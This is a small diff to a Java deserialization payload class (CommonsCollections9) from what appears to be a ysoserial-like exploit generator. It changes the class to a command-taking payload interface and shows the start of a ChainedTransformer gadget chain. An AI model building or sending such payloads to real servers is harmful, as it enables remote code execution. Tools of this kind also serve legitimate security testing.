@@ -11,13 +11,14 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.DefaultedMap;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.JavaVersion;
 import com.h2tg.ysogate.utils.Reflections;
 
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
-public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException> {
+public class CommonsCollections9 implements CommandObjectPayload<BadAttributeValueExpException>
+{
 
 	public BadAttributeValueExpException getObject(String command) throws Exception {
 		ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
